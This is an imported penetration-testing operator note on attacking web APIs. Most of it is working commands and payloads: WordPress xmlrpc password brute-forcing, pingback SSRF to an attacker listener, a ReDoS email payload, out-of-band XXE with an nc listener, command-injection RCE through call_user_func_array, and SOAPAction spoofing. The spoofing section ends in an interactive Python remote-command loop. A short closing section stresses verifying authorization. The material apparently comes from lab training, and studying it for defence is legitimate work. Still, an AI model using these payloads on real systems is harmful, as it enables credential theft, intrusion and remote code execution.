---
technique: "API"
family: "misc"
severity_hint: "medium"
tags: []
source: "_raw/API.md"
source_sha256: "4789de48e8968ecf7464262b9d6084b91853204dbf279a4dd3da57e78667380e"
curator_version: 2
review_status: imported-unreviewed
---

# API

> Family: **misc** · Severity hint: **medium** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- WordPress `xmlrpc.php`: `system.listMethods`, `wp.getUsersBlogs` brute-force, `pingback.ping` SSRF/IP-disclosure
- ReDoS against regex email-validation API
- XXE via API (`text/plain` trick, OOB entity exfil)
- Command-injection RCE via `call_user_func_array` + `PATH_INFO`
- SOAPAction spoofing + WSDL enumeration

## Playbook (operator notes)

### WordPress `xmlrpc.php` attacks

`xmlrpc.php` being enabled is not itself a vuln, but depending on the exposed methods it enables enumeration and exploitation. Detect by simply requesting `xmlrpc.php` on the target.

**Enumerate available methods (`system.listMethods`)** — pick the useful ones (`wp.getUsersBlogs`, `pingback.ping`, `wp.getUsers`, `wp.uploadFile`, …):

```sh
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://target.example/xmlrpc.php
```

Excerpt of the returned method list:

```xml
<value><string>system.multicall</string></value>
<value><string>system.listMethods</string></value>
<value><string>pingback.ping</string></value>
<value><string>wp.uploadFile</string></value>
<value><string>wp.getUsers</string></value>
<value><string>wp.getUsersBlogs</string></value>
```

**Credential brute-force (`wp.getUsersBlogs`)** — no lockout, so ideal for password spraying against a known user. Valid creds return the blog struct:

```sh
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://target.example/xmlrpc.php
```

Success response:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://target.example/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://target.example/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Wrong credentials return `403` faultCode:

```sh
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>WRONG-PASSWORD</value></param></params></methodCall>" http://target.example/xmlrpc.php
```

```xml
<methodResponse><fault><value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value></fault></methodResponse>
```

**`pingback.ping` SSRF / IP disclosure** — if `pingback.ping` is exposed it enables IP disclosure (unmask origin behind Cloudflare — pingback originates from the WP host to an attacker-controlled listener), XSPA port scanning (point pingback at self/internal hosts on different ports; infer open via timing/response diff), and DDoS reflection. First param = attacker-controlled URL; second param = any valid post URL on the target:

```http
POST /xmlrpc.php HTTP/1.1
Host: target.example
Connection: keep-alive
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://<LHOST>/</string></value>
</param>
<param>
<value><string>https://target.example/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```

### ReDoS against a regex email-validation API

The API returns its own validation regex. `/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/` contains nested quantifiers that catastrophically backtrack. Baseline vs malicious payload — the second takes several seconds; longer payloads increase evaluation time:

```sh
curl "http://<TARGET>/api/check-email?email=test_value"
```

```sh
curl "http://<TARGET>/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
```

The large response-time difference confirms ReDoS.

### XXE via API (`text/plain` trick + OOB entity exfil)

The login API accepts XML but the JSON front-end sends `Content-Type: text/plain;charset=UTF-8`, which slips XML past filters expecting `application/xml`:

```http
POST /api/login/ HTTP/1.1
Host: <TARGET>
Content-Type: text/plain;charset=UTF-8
Content-Length: 111

<?xml version="1.0" encoding="UTF-8"?><root><email>test@test.com</email><password>P@ssw0rd123</password></root>
```

Inject an out-of-band external entity pointing at a listener, then reference it in a reflected field. Start the listener:

```sh
nc -nlvp 4444
```

Baseline (defines entity, not yet referenced):

```sh
curl -X POST http://<TARGET>/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<LHOST>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
```

Trigger by referencing `&somename;` in the `email` field — the parser fetches the URL:

```sh
curl -X POST http://<TARGET>/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<LHOST>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```

Callback confirms XXE:

```sh
nc -nlvp 4444
listening on [any] 4444 ...
connect to [<LHOST>] from (UNKNOWN) [<TARGET>] 54984
GET / HTTP/1.0
Host: <LHOST>:4444
Connection: close
```

### Command-injection RCE via `call_user_func_array` + `PATH_INFO`

Connectivity-checker service at `http://<TARGET>/ping-server.php/ping`. The intended call is `.../ping-server.php/ping/<host>/<packets>`. Vulnerable source dispatches an arbitrary function name from `PATH_INFO`:

```php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
```

`call_user_func_array($prt[1], …)` treats the first path segment as the function name and remaining segments as its args — so instead of `ping` an attacker calls any PHP function (e.g. `system`) with attacker args, bypassing the `escapeshellarg()` / packet checks entirely. RCE via `system/<cmd>`:

```sh
curl http://<TARGET>/ping-server.php/system/ls
index.php
ping-server.php
```

### SOAPAction spoofing + WSDL enumeration

If a SOAP service picks the operation to execute solely from the `SOAPAction` HTTP header (not the XML body element), it is vulnerable to SOAPAction spoofing — a body invoking an allowed operation, but a `SOAPAction` header naming a restricted one, can reach the restricted handler.

**Enumerate the WSDL:**

```sh
curl http://<TARGET>/wsdl?wsdl
```

Key findings — a restricted `ExecuteCommand` operation with a `cmd` parameter:

```xml
<s:element name="ExecuteCommandRequest">
  <s:complexType><s:sequence>
    <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
  </s:sequence></s:complexType>
</s:element>

<wsdl:operation name="ExecuteCommand">
  <soap:operation soapAction="ExecuteCommand" style="document"/>
</wsdl:operation>
```

**Direct call is blocked** (body + header both `ExecuteCommand`) — "This function is only allowed in internal networks":

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET>/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

**Spoof it** — body uses the allowed `LoginRequest` (with the `cmd` param from `ExecuteCommand`), header names the blocked `ExecuteCommand`. Service routes on the header → executes `whoami` as root:

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET>/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

Result: `<LoginResponse ...><success>true</success><result>root\n</result></LoginResponse>`.

Interactive variant (loop on stdin, one command per line):

```python
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET>/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

## Reviewed consolidation — API discovery

Use `../modern/api-inventory-resource-consumption.md` as the primary method.
OpenAPI/WSDL documents, client routes, observed traffic, and bounded route-wordlist
discovery are complementary inputs: a hit is a lead until method, authentication,
authorization, and response semantics are verified. Kiterunner remains a useful
route-discovery project reference, but derive invocation and rate/concurrency flags
from the installed version's help and the active engagement policy. Never inherit a
third-party wordlist's methods or request bodies as authorization to mutate state.

Project reference: [assetnote/kiterunner](https://github.com/assetnote/kiterunner).

### Merged provenance

| retired curated note | curated SHA-256 | original source | original SHA-256 |
|---|---|---|---|
| `api-rest.md` | `52e419371f0c2e08352933d17d79d2a155c0b33f4afd412bbbbec0d4d1ae4340` | `_raw/API/REST.md` | `3f6bf3dfc08efeccb8806558ff03cca720f8d39fa220971933a4d3de1dc703db` |
| `api-tools-kiterunner.md` | `4b240828c726d0935c3305491729238adb090036fc10336a0809f1acb49125fe` | `_raw/API/Tools/kiterunner.md` | `928b5d1ec9b7fecfc589bf35866eafaaa2ec62ed57c5267cf27473d424d9ee40` |

The retired notes contributed project links only; their stale/unbounded operator
syntax was not retained.

## Source
Original note: `_raw/API.md`
